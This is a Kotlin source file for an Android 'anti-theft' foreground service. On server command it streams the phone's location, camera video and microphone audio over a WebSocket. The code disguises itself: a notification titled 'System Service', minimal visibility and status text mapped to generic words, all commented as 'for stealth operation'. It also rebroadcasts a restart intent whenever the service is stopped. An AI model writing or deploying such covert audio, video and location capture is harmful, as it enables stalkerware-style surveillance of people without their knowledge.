package com.antitheft.service

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.lifecycle.LifecycleService
import com.antitheft.R
import com.antitheft.media.AudioRecorder
import com.antitheft.media.CameraManager
import com.antitheft.media.LocationProvider
import com.antitheft.media.LocationData
import com.antitheft.network.NetworkCallback
import com.antitheft.network.NetworkMonitor
import com.antitheft.network.WebSocketCallbacks
import com.antitheft.network.WebSocketClient
import com.antitheft.receiver.ServiceRestartReceiver
import com.antitheft.ui.MainActivity
import com.antitheft.utils.Constants
import com.antitheft.utils.PermissionHelper
import com.antitheft.utils.PreferencesManager
import com.antitheft.worker.CheckInWorker

/**
 * Foreground service that handles location, video, and audio tracking
 * Runs when activated by server check-in response
 * Uses LifecycleService to support CameraX lifecycle binding
 */
class TrackingService : LifecycleService(), WebSocketCallbacks, NetworkCallback {

    // Media capture components
    private var locationProvider: LocationProvider? = null
    private var cameraManager: CameraManager? = null
    private var audioRecorder: AudioRecorder? = null

    // Networking components
    private lateinit var prefsManager: PreferencesManager
    private var webSocketClient: WebSocketClient? = null
    private var networkMonitor: NetworkMonitor? = null
    private var isStreamingActive = false

    // Main thread handler — WebSocket callbacks arrive on OkHttp threads,
    // but Android lifecycle/media operations must run on the main thread
    private val mainHandler = Handler(Looper.getMainLooper())

    override fun onCreate() {
        super.onCreate()
        isRunning = true
        Log.d(TAG, "TrackingService created")
        createNotificationChannel()

        // Initialize PreferencesManager
        prefsManager = PreferencesManager(this)

        // Initialize WebSocket client
        webSocketClient = WebSocketClient(prefsManager, this)

        // Initialize and start network monitor
        networkMonitor = NetworkMonitor(this, this)
        networkMonitor?.startMonitoring()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        Log.i(TAG, "TrackingService started")

        // Start as foreground service with notification
        val notification = createNotification("Connecting to server...")
        startForeground(Constants.NOTIFICATION_ID, notification)

        // Check if all required permissions are granted
        if (!PermissionHelper.hasAllPermissions(this)) {
            Log.e(TAG, "Missing required permissions. Cannot start tracking.")
            stopSelf()
            return START_NOT_STICKY
        }

        // Cancel rapid polling — tracking service is taking over
        CheckInWorker.cancelRapidPolling(this)

        // Connect to WebSocket server
        webSocketClient?.connect()
        Log.i(TAG, "Connecting to WebSocket server...")

        // Media capture will start after WebSocket connects (onConnected callback)

        return START_STICKY
    }

    /**
     * Initializes and starts all media capture components.
     * Each component is wrapped in its own try-catch so a single failure
     * doesn't prevent the others from starting.
     */
    private fun startMediaCapture() {
        var startedCount = 0

        // Initialize LocationProvider
        try {
            locationProvider = LocationProvider(this).apply {
                if (checkPermissions()) {
                    startLocationUpdates { locationData ->
                        handleLocationUpdate(locationData)
                    }
                    Log.i(TAG, "Location tracking started")
                    startedCount++
                } else {
                    Log.e(TAG, "Location permissions not granted")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start location tracking", e)
        }

        // Initialize CameraManager
        try {
            cameraManager = CameraManager(this).apply {
                if (checkPermissions()) {
                    startCapture(this@TrackingService) { frameData ->
                        handleVideoFrame(frameData)
                    }
                    Log.i(TAG, "Camera capture started")
                    startedCount++
                } else {
                    Log.e(TAG, "Camera permission not granted")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start camera capture", e)
        }

        // Initialize AudioRecorder
        try {
            audioRecorder = AudioRecorder(this).apply {
                if (checkPermissions()) {
                    startRecording { audioData ->
                        handleAudioChunk(audioData)
                    }
                    Log.i(TAG, "Audio recording started")
                    startedCount++
                } else {
                    Log.e(TAG, "Audio permission not granted")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start audio recording", e)
        }

        Log.i(TAG, "Media capture initialized: $startedCount/3 components started")
    }

    /**
     * Handles location updates from LocationProvider
     * Sends location data to server via WebSocket
     */
    private fun handleLocationUpdate(locationData: LocationData) {
        Log.d(TAG, "Location: ${locationData.latitude}, ${locationData.longitude} (accuracy: ${locationData.accuracy}m)")

        if (isStreamingActive && webSocketClient?.isConnected() == true) {
            webSocketClient?.sendLocation(locationData)
        }
    }

    /**
     * Handles video frames from CameraManager
     * Sends video frames to server via WebSocket
     */
    private fun handleVideoFrame(frameData: ByteArray) {
        Log.d(TAG, "Video frame captured: ${frameData.size} bytes")

        if (isStreamingActive && webSocketClient?.isConnected() == true) {
            webSocketClient?.sendVideoFrame(frameData)
        }
    }

    /**
     * Handles audio chunks from AudioRecorder
     * Sends audio chunks to server via WebSocket
     */
    private fun handleAudioChunk(audioData: ByteArray) {
        Log.d(TAG, "Audio chunk captured: ${audioData.size} bytes")

        if (isStreamingActive && webSocketClient?.isConnected() == true) {
            webSocketClient?.sendAudioChunk(audioData)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        isRunning = false
        Log.i(TAG, "TrackingService stopped")

        // Stop streaming
        isStreamingActive = false

        // Stop network monitoring
        networkMonitor?.stopMonitoring()
        networkMonitor = null

        // Disconnect WebSocket
        webSocketClient?.disconnect(allowReconnect = false)
        webSocketClient = null

        // Stop all media capture components
        stopMediaCapture()

        // Send restart broadcast to attempt service restart
        val restartIntent = Intent(this, ServiceRestartReceiver::class.java)
        restartIntent.action = "com.antitheft.RESTART_SERVICE"
        sendBroadcast(restartIntent)
        Log.d(TAG, "Service restart broadcast sent")
    }

    /**
     * Stops and releases all media capture components
     */
    private fun stopMediaCapture() {
        try {
            // Stop camera capture
            cameraManager?.stopCapture()
            cameraManager?.release()
            cameraManager = null
            Log.d(TAG, "Camera capture stopped")

            // Stop audio recording
            audioRecorder?.stopRecording()
            audioRecorder = null
            Log.d(TAG, "Audio recording stopped")

            // Stop location updates
            locationProvider?.stopLocationUpdates()
            locationProvider = null
            Log.d(TAG, "Location updates stopped")

            Log.i(TAG, "All media capture components stopped successfully")

        } catch (e: Exception) {
            Log.e(TAG, "Error stopping media capture", e)
        }
    }

    /**
     * Creates notification channel for Android O and above
     * Required for foreground services on Android 8.0+
     * Uses disguised settings for stealth operation
     */
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                Constants.NOTIFICATION_CHANNEL_ID,
                Constants.NOTIFICATION_CHANNEL_NAME,
                NotificationManager.IMPORTANCE_MIN  // Minimize importance for stealth
            ).apply {
                description = Constants.NOTIFICATION_CHANNEL_DESCRIPTION
                setShowBadge(false)
                setSound(null, null)  // No sound
                enableVibration(false)  // No vibration
            }

            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
            Log.d(TAG, "Notification channel created")
        }
    }

    /**
     * Creates the foreground notification
     * Uses disguised text and icons for stealth operation
     */
    private fun createNotification(statusText: String = "Running"): Notification {
        // Create intent to open MainActivity when notification is tapped
        val notificationIntent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            notificationIntent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        return NotificationCompat.Builder(this, Constants.NOTIFICATION_CHANNEL_ID)
            .setContentTitle("System Service")  // Disguised title
            .setContentText(statusText)
            .setSmallIcon(android.R.drawable.ic_dialog_info)  // Generic info icon
            .setContentIntent(pendingIntent)
            .setOngoing(true)  // Notification cannot be dismissed
            .setPriority(NotificationCompat.PRIORITY_MIN)  // Minimize visibility
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setSound(null)  // No sound
            .setVibrate(null)  // No vibration
            .setShowWhen(false)  // Don't show timestamp
            .build()
    }

    /**
     * Updates the foreground notification with new status text
     * Maps specific status messages to generic disguised text
     */
    private fun updateNotification(statusText: String) {
        // Map specific status messages to generic disguised text
        val disguisedText = when {
            statusText.contains("Connecting", ignoreCase = true) -> "Initializing..."
            statusText.contains("Connected", ignoreCase = true) -> "Active"
            statusText.contains("Streaming", ignoreCase = true) -> "Running"
            statusText.contains("Disconnected", ignoreCase = true) -> "Standby"
            statusText.contains("Reconnecting", ignoreCase = true) -> "Reconnecting..."
            statusText.contains("error", ignoreCase = true) -> "Processing"
            statusText.contains("Network", ignoreCase = true) -> "Standby"
            statusText.contains("Stopped", ignoreCase = true) -> "Stopped"
            statusText.contains("Waiting", ignoreCase = true) -> "Standby"
            else -> "Running"
        }

        val notification = createNotification(disguisedText)
        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        notificationManager.notify(Constants.NOTIFICATION_ID, notification)
    }

    // ==================== WebSocket Callbacks ====================
    // All callbacks are dispatched to the main thread because OkHttp delivers
    // them on its own background threads, but Android lifecycle/media/notification
    // operations must run on the main thread.

    override fun onConnected() {
        Log.i(TAG, "WebSocket connected successfully")
        mainHandler.post { updateNotification("Connected - Waiting for registration...") }
    }

    override fun onRegistered() {
        Log.i(TAG, "Device registered with server - Starting media capture")
        mainHandler.postDelayed({
            updateNotification("Streaming location, video, and audio")
            isStreamingActive = true
            startMediaCapture()
        }, 500) // Brief delay lets the service lifecycle fully stabilize
    }

    override fun onDisconnected(reason: String) {
        Log.w(TAG, "WebSocket disconnected: $reason")
        mainHandler.post {
            updateNotification("Disconnected - Will reconnect...")
            isStreamingActive = false
        }
    }

    override fun onConnectionError(error: String) {
        Log.e(TAG, "WebSocket connection error: $error")
        mainHandler.post {
            updateNotification("Connection error - Retrying...")
            isStreamingActive = false
        }
    }

    override fun onReconnecting(attempt: Int, delayMs: Long) {
        Log.i(TAG, "Reconnecting (attempt $attempt) in ${delayMs}ms...")
        mainHandler.post {
            updateNotification("Reconnecting (attempt $attempt)...")
            isStreamingActive = false
        }
    }

    override fun onMaxReconnectAttemptsReached() {
        Log.e(TAG, "Max reconnection attempts reached - Stopping service")
        mainHandler.post {
            updateNotification("Connection failed - Stopping")
            stopSelf()
        }
    }

    override fun onActivationChanged(activated: Boolean) {
        Log.i(TAG, "Activation state changed: $activated")
        if (!activated) {
            Log.i(TAG, "Tracking deactivated by server - Stopping service")
            mainHandler.post { stopSelf() }
        } else if (!isStreamingActive) {
            Log.i(TAG, "Tracking re-activated by server - Resuming media streaming")
            mainHandler.post { startMediaStreaming() }
        }
    }

    override fun onStopCommand() {
        Log.i(TAG, "Received stop media services command from server")
        mainHandler.post { stopMediaStreaming() }
    }

    override fun onStartCommand() {
        Log.i(TAG, "Received start media services command from server")
        mainHandler.post { startMediaStreaming() }
    }

    /**
     * Stops all media capture (location, video, audio) but keeps service running
     */
    private fun stopMediaStreaming() {
        Log.i(TAG, "🛑 stopMediaStreaming() START")
        Log.i(TAG, "Current isStreamingActive before stop: $isStreamingActive")

        // Stop streaming flag
        isStreamingActive = false
        Log.i(TAG, "✓ Set isStreamingActive = false")

        // Stop all media capture
        Log.i(TAG, "Calling stopMediaCapture()...")
        stopMediaCapture()
        Log.i(TAG, "✓ stopMediaCapture() completed")

        // Update notification to show services stopped
        updateNotification("Service active - Streaming stopped")
        Log.i(TAG, "✓ Notification updated")

        Log.i(TAG, "🛑 stopMediaStreaming() COMPLETED - Media streaming stopped successfully")
    }

    /**
     * Restarts all media capture (location, video, audio)
     */
    private fun startMediaStreaming() {
        Log.i(TAG, "Starting media streaming")

        // Set streaming flag
        isStreamingActive = true

        // Restart all media capture
        startMediaCapture()

        // Update notification to show services active
        updateNotification("Service active - Streaming")

        Log.i(TAG, "Media streaming started successfully")
    }

    override fun onServerError(error: String) {
        Log.e(TAG, "Server error: $error")
        updateNotification("Server error: $error")
    }

    // ==================== End of WebSocket Callbacks ====================

    // ==================== Network Callbacks ====================

    override fun onNetworkAvailable() {
        Log.i(TAG, "Network available - Attempting WebSocket reconnection")
        updateNotification("Network restored - Reconnecting...")

        // Attempt to reconnect WebSocket if not already connected
        if (webSocketClient?.isConnected() == false) {
            webSocketClient?.connect()
        }
    }

    override fun onNetworkLost() {
        Log.w(TAG, "Network lost")
        updateNotification("Network lost - Waiting for connection...")

        // Pause streaming
        isStreamingActive = false
    }

    override fun onNetworkUnavailable() {
        Log.w(TAG, "Network unavailable")
        updateNotification("No network connection")

        // Pause streaming
        isStreamingActive = false
    }

    override fun onNetworkTypeChanged(type: String) {
        Log.i(TAG, "Network type changed to: $type")
        // No action needed, just log the change
    }

    // ==================== End of Network Callbacks ====================

    companion object {
        private const val TAG = "TrackingService"

        @Volatile
        var isRunning = false
            private set

        /**
         * Starts the TrackingService as a foreground service
         * @param context Application context
         */
        fun start(context: Context) {
            val intent = Intent(context, TrackingService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
            Log.i(TAG, "TrackingService start requested")
        }

        /**
         * Stops the TrackingService
         * @param context Application context
         */
        fun stop(context: Context) {
            val intent = Intent(context, TrackingService::class.java)
            context.stopService(intent)
            Log.i(TAG, "TrackingService stop requested")
        }
    }
}
